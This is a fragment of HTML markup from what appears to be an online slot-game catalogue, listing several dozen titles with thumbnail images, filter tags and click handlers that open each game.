                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/20517e5b9ec3c5ee14f5e4ad8013e918.webp?v=0.1" src="/assets/games/i/165x220/20517e5b9ec3c5ee14f5e4ad8013e918.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="5 Rabbits Megaways™">5 Rabbits Megaways™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Big Bass Bonanza - Keeping it Reel" data-filter="ALL,NEW,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Big Bass Bonanza - Keeping it Reel', '/assets/games/i/165x220/7f64d08c69b5dd09c1a0a812b1085a4b.webp?v=0.1' , 'vs10bbkir', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/7f64d08c69b5dd09c1a0a812b1085a4b.webp?v=0.1" src="/assets/games/i/165x220/7f64d08c69b5dd09c1a0a812b1085a4b.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Big Bass Bonanza - Keeping it Reel">Big Bass Bonanza - Keeping it Reel</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Lucky Fishing Megaways™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Lucky Fishing Megaways™', '/assets/games/i/165x220/2e1dedcfd50024480ff6fe73a930789b.webp?v=0.1' , 'vswaysluckyfish', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/2e1dedcfd50024480ff6fe73a930789b.webp?v=0.1" src="/assets/games/i/165x220/2e1dedcfd50024480ff6fe73a930789b.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Lucky Fishing Megaways™">Lucky Fishing Megaways™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Shield Of Sparta™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Shield Of Sparta™', '/assets/games/i/165x220/bce16c5ba24994f6b93f8b8d2f2d928d.webp?v=0.1' , 'vs20sparta', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/bce16c5ba24994f6b93f8b8d2f2d928d.webp?v=0.1" src="/assets/games/i/165x220/bce16c5ba24994f6b93f8b8d2f2d928d.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Shield Of Sparta™">Shield Of Sparta™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Gates of Gatot Kaca" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Gates of Gatot Kaca', '/assets/games/i/165x220/199551e6c36faad9a53ab54b301af1bf.webp?v=0.1' , 'vs20gatotgates', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/199551e6c36faad9a53ab54b301af1bf.webp?v=0.1" src="/assets/games/i/165x220/199551e6c36faad9a53ab54b301af1bf.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Gates of Gatot Kaca">Gates of Gatot Kaca</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Pirate Golden Age™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Pirate Golden Age™', '/assets/games/i/165x220/51c736d7fef3ad49f948590ef058fc23.webp?v=0.1' , 'vs20mtreasure', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/51c736d7fef3ad49f948590ef058fc23.webp?v=0.1" src="/assets/games/i/165x220/51c736d7fef3ad49f948590ef058fc23.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Pirate Golden Age™">Pirate Golden Age™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Gems of Serengeti™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Gems of Serengeti™', '/assets/games/i/165x220/0abedabe14adfa2013524d8d9458284e.webp?v=0.1' , 'vs20lcount', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/0abedabe14adfa2013524d8d9458284e.webp?v=0.1" src="/assets/games/i/165x220/0abedabe14adfa2013524d8d9458284e.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Gems of Serengeti™">Gems of Serengeti™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Firebird Spirit" data-filter="ALL,NEW,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Firebird Spirit', '/assets/games/i/165x220/7e50b5806fed8c950b2d20eb1eeaf0df.webp?v=0.1' , 'vswaysconcoll', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/7e50b5806fed8c950b2d20eb1eeaf0df.webp?v=0.1" src="/assets/games/i/165x220/7e50b5806fed8c950b2d20eb1eeaf0df.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Firebird Spirit">Firebird Spirit</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Towering Fortunes™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Towering Fortunes™', '/assets/games/i/165x220/10e630c3497aa315085f1250131f2f1a.webp?v=0.1' , 'vs20theights', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/10e630c3497aa315085f1250131f2f1a.webp?v=0.1" src="/assets/games/i/165x220/10e630c3497aa315085f1250131f2f1a.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Towering Fortunes™">Towering Fortunes™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Starlight Christmas" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Starlight Christmas', '/assets/games/i/165x220/200242e938cdb768a8ad94e0f18e1f22.webp?v=0.1' , 'vs20schristmas', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/200242e938cdb768a8ad94e0f18e1f22.webp?v=0.1" src="/assets/games/i/165x220/200242e938cdb768a8ad94e0f18e1f22.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Starlight Christmas">Starlight Christmas</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Aztec Blaze™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Aztec Blaze™', '/assets/games/i/165x220/a4a4b65001b0028fa5c69dc844cf47a2.webp?v=0.1' , 'vs25kfruit', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/a4a4b65001b0028fa5c69dc844cf47a2.webp?v=0.1" src="/assets/games/i/165x220/a4a4b65001b0028fa5c69dc844cf47a2.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Aztec Blaze™">Aztec Blaze™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Santa&amp;quot;amp;s Great Gifts™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Santa&amp;quot;amp;s Great Gifts™', '/assets/games/i/165x220/357acf18eeaa77bd94462de839eae83f.webp?v=0.1' , 'vs20porbs', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/357acf18eeaa77bd94462de839eae83f.webp?v=0.1" src="/assets/games/i/165x220/357acf18eeaa77bd94462de839eae83f.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Santa's Great Gifts™">Santa's Great Gifts™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Release the Kraken 2™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Release the Kraken 2™', '/assets/games/i/165x220/7bcebc60325a6bb17e393338c0b41107.webp?v=0.1' , 'vs20kraken2', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/7bcebc60325a6bb17e393338c0b41107.webp?v=0.1" src="/assets/games/i/165x220/7bcebc60325a6bb17e393338c0b41107.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Release the Kraken 2™">Release the Kraken 2™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Bigger Bass Blizzard-Christmas Catch" data-filter="ALL,NEW,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Bigger Bass Blizzard-Christmas Catch', '/assets/games/i/165x220/0d2814080d477a6b85e5205a944c59fb.webp?v=0.1' , 'vs12bbbxmas', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/0d2814080d477a6b85e5205a944c59fb.webp?v=0.1" src="/assets/games/i/165x220/0d2814080d477a6b85e5205a944c59fb.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Bigger Bass Blizzard-Christmas Catch">Bigger Bass Blizzard-Christmas Catch</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="John Hunter &amp;quot; the Book of Tut Respin™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'John Hunter &amp;quot; the Book of Tut Respin™', '/assets/games/i/165x220/ff11fc4f386b79d0008a35691d485068.webp?v=0.1' , 'vs10tut', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/ff11fc4f386b79d0008a35691d485068.webp?v=0.1" src="/assets/games/i/165x220/ff11fc4f386b79d0008a35691d485068.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="John Hunter &amp; the Book of Tut Respin™">John Hunter &amp; the Book of Tut Respin™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Spin &amp;quot; Score Megaways™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Spin &amp;quot; Score Megaways™', '/assets/games/i/165x220/07d79b0ffde5c786047c45bfbfbe2769.webp?v=0.1' , 'vswaysfrywld', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/07d79b0ffde5c786047c45bfbfbe2769.webp?v=0.1" src="/assets/games/i/165x220/07d79b0ffde5c786047c45bfbfbe2769.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Spin &amp; Score Megaways™">Spin &amp; Score Megaways™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Old Gold Miner Megaways™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Old Gold Miner Megaways™', '/assets/games/i/165x220/82953622d6f1d4a07cd8d7173434beed.webp?v=0.1' , 'vswaysoldminer', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/82953622d6f1d4a07cd8d7173434beed.webp?v=0.1" src="/assets/games/i/165x220/82953622d6f1d4a07cd8d7173434beed.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Old Gold Miner Megaways™">Old Gold Miner Megaways™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Sword of Ares™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Sword of Ares™', '/assets/games/i/165x220/e45dd4f2027318e1536a1a46858291a3.webp?v=0.1' , 'vs20swordofares', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/e45dd4f2027318e1536a1a46858291a3.webp?v=0.1" src="/assets/games/i/165x220/e45dd4f2027318e1536a1a46858291a3.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Sword of Ares™">Sword of Ares™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Kingdom of Asgard™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Kingdom of Asgard™', '/assets/games/i/165x220/f7ba95f912725a113f703125ea623c41.webp?v=0.1' , 'vs20asgard', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/f7ba95f912725a113f703125ea623c41.webp?v=0.1" src="/assets/games/i/165x220/f7ba95f912725a113f703125ea623c41.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Kingdom of Asgard™">Kingdom of Asgard™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Crown Fire™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Crown Fire™', '/assets/games/i/165x220/a95e677004932f6d21f7f91f8e112160.webp?v=0.1' , 'vs10crownfire', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/a95e677004932f6d21f7f91f8e112160.webp?v=0.1" src="/assets/games/i/165x220/a95e677004932f6d21f7f91f8e112160.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Crown Fire™">Crown Fire™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Snakes &amp;quot; Ladders - Snake Eyes" data-filter="ALL,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Snakes &amp;quot; Ladders - Snake Eyes', '/assets/games/i/165x220/91ba9a6a41a3e77fa8f9498887172e12.webp?v=0.1' , 'vs10snakeeyes', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/91ba9a6a41a3e77fa8f9498887172e12.webp?v=0.1" src="/assets/games/i/165x220/91ba9a6a41a3e77fa8f9498887172e12.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Snakes &amp; Ladders - Snake Eyes">Snakes &amp; Ladders - Snake Eyes</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Striking Hot 5™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Striking Hot 5™', '/assets/games/i/165x220/a0839d508ad4af4b66572fe5fc8f33ec.webp?v=0.1' , 'vs5strh', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/a0839d508ad4af4b66572fe5fc8f33ec.webp?v=0.1" src="/assets/games/i/165x220/a0839d508ad4af4b66572fe5fc8f33ec.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Striking Hot 5™">Striking Hot 5™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Book of Golden Sands™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Book of Golden Sands™', '/assets/games/i/165x220/60666933ea0297f3625aa1fc070ea594.webp?v=0.1' , 'vswaysbook', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/60666933ea0297f3625aa1fc070ea594.webp?v=0.1" src="/assets/games/i/165x220/60666933ea0297f3625aa1fc070ea594.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Book of Golden Sands™">Book of Golden Sands™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Wild Hop &amp;quot; Drop™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Wild Hop &amp;quot; Drop™', '/assets/games/i/165x220/79e60cd4fcc89f056b042f71a887c69b.webp?v=0.1' , 'vs20mparty', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/79e60cd4fcc89f056b042f71a887c69b.webp?v=0.1" src="/assets/games/i/165x220/79e60cd4fcc89f056b042f71a887c69b.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Wild Hop &amp; Drop™">Wild Hop &amp; Drop™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Legend of Heroes Megaways™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Legend of Heroes Megaways™', '/assets/games/i/165x220/0e0400aa2a345dfb02759a232f35f526.webp?v=0.1' , 'vswayslofhero', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/0e0400aa2a345dfb02759a232f35f526.webp?v=0.1" src="/assets/games/i/165x220/0e0400aa2a345dfb02759a232f35f526.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Legend of Heroes Megaways™">Legend of Heroes Megaways™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fire Hot 100" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fire Hot 100', '/assets/games/i/165x220/a8b27e8f4267552a2f1348516f8fb042.webp?v=0.1' , 'vs100firehot', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/a8b27e8f4267552a2f1348516f8fb042.webp?v=0.1" src="/assets/games/i/165x220/a8b27e8f4267552a2f1348516f8fb042.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fire Hot 100">Fire Hot 100</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Cheeky Emperor" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Cheeky Emperor', '/assets/games/i/165x220/880c2d30c3d792ac57e76a19c6199b66.webp?v=0.1' , 'vs243ckemp', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/880c2d30c3d792ac57e76a19c6199b66.webp?v=0.1" src="/assets/games/i/165x220/880c2d30c3d792ac57e76a19c6199b66.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Cheeky Emperor">Cheeky Emperor</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Sugar Rush™" data-filter="ALL,HYPERPLAY" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Sugar Rush™', '/assets/games/i/165x220/a28bfbfb5b7ed5ec124cc33bfa3e0430.webp?v=0.1' , 'vs20sugarrush', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/a28bfbfb5b7ed5ec124cc33bfa3e0430.webp?v=0.1" src="/assets/games/i/165x220/a28bfbfb5b7ed5ec124cc33bfa3e0430.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Sugar Rush™">Sugar Rush™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Octobeer Fortunes™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Octobeer Fortunes™', '/assets/games/i/165x220/b27a442c4fb41f8ce9618edbd922b269.webp?v=0.1' , 'vs20octobeer', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/b27a442c4fb41f8ce9618edbd922b269.webp?v=0.1" src="/assets/games/i/165x220/b27a442c4fb41f8ce9618edbd922b269.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Octobeer Fortunes™">Octobeer Fortunes™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Down The Rails™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Down The Rails™', '/assets/games/i/165x220/40303b305aae2aeae535045df146b3a1.webp?v=0.1' , 'vs20underground', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/40303b305aae2aeae535045df146b3a1.webp?v=0.1" src="/assets/games/i/165x220/40303b305aae2aeae535045df146b3a1.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Down The Rails™">Down The Rails™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Muertos Multiplier Megaways™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Muertos Multiplier Megaways™', '/assets/games/i/165x220/d750ff8b985ec2dbfcb034ff71531a16.webp?v=0.1' , 'vs20muertos', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/d750ff8b985ec2dbfcb034ff71531a16.webp?v=0.1" src="/assets/games/i/165x220/d750ff8b985ec2dbfcb034ff71531a16.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Muertos Multiplier Megaways™">Muertos Multiplier Megaways™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fire Hot 20™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fire Hot 20™', '/assets/games/i/165x220/4deebc118918c84f8bc594a88f9422ab.webp?v=0.1' , 'vs20fh', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/4deebc118918c84f8bc594a88f9422ab.webp?v=0.1" src="/assets/games/i/165x220/4deebc118918c84f8bc594a88f9422ab.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fire Hot 20™">Fire Hot 20™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Floating Dragon Megaways™" data-filter="ALL,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Floating Dragon Megaways™', '/assets/games/i/165x220/4708ece58042a67b60968a4e1012a454.webp?v=0.1' , 'vswaysfltdrg', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/4708ece58042a67b60968a4e1012a454.webp?v=0.1" src="/assets/games/i/165x220/4708ece58042a67b60968a4e1012a454.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Floating Dragon Megaways™">Floating Dragon Megaways™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Wildman Super Bonanza" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Wildman Super Bonanza', '/assets/games/i/165x220/858a99ed526891fad5f3b4d891a3d807.webp?v=0.1' , 'vs20wildman', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/858a99ed526891fad5f3b4d891a3d807.webp?v=0.1" src="/assets/games/i/165x220/858a99ed526891fad5f3b4d891a3d807.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Wildman Super Bonanza">Wildman Super Bonanza</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fire Hot 5™" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fire Hot 5™', '/assets/games/i/165x220/677047c096f8103e9983d5d4fb49640b.webp?v=0.1' , 'vs5firehot', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/677047c096f8103e9983d5d4fb49640b.webp?v=0.1" src="/assets/games/i/165x220/677047c096f8103e9983d5d4fb49640b.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fire Hot 5™">Fire Hot 5™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Hot to Burn Extreme" data-filter="ALL,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Hot to Burn Extreme', '/assets/games/i/165x220/c863ec985414b33c48f191d727be8f15.webp?v=0.1' , 'vs40hotburnx', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/c863ec985414b33c48f191d727be8f15.webp?v=0.1" src="/assets/games/i/165x220/c863ec985414b33c48f191d727be8f15.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Hot to Burn Extreme">Hot to Burn Extreme</h5>
        </a>
        
     
